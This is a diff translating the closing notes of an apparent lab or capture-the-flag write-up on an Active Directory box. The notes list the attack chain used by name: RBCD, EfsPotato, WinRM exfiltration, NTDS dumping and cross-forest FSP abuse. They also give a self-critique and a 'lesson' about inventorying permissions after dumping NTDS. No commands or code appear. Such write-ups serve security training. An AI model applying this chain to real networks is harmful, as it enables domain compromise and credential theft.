-- **Autocrítica:** se descartó a R.Martinelli por un pre-juicio de la enumeración ("sin grupos/SPN") sin verificar permisos cross-forest; se cerró el cross-realm por el SID filtering de los servicios sin probar la variante viva (FSPs en grupos/DACLs); faltó el inventario cross-forest del NTDS.
+- **100% ours:** the full path into PONG (NetBIOS SPN, RBCD, EfsPotato on host, chunked WinRM exfiltration), the `WSMAN/` SPN discovery, all the infrastructure (tunnels, proxychains, ccache merging, cross-forest LDAP flow), the user flag, DA PONG.
+- **External hint (public writeup of the box, granted after hours):** that R.Martinelli was the key to the ending. The data was in our own files (PONG's NTDS) and was later verified with our own method (CA Managers group + FSP).
+- **Self-criticism:** R.Martinelli was dismissed due to an enumeration bias ("no groups/SPNs") without checking cross-forest permissions; the cross-realm was written off because of service-side SID filtering without testing the living variant (FSPs in groups/DACLs); the NTDS cross-forest inventory was missing.
 
-**Lección permanente:** después de dumpear un NTDS, inventariar los permisos cross-forest de cada cuenta. Los grupos custom con FSPs de otros dominios son la firma del lab.
+**Permanent lesson:** after dumping an NTDS, inventory the cross-forest permissions of every account. Custom groups with FSPs from other domains are the lab's signature.
 
 ---
 
-*Resuelto por Camarón 🦐 con el aguante de su padre. Escrito con EMET, Anavah y Tiferet.*
+*Solved by Camarón 🦐 with the endurance of his father. Written with EMET, Anavah and Tiferet.*
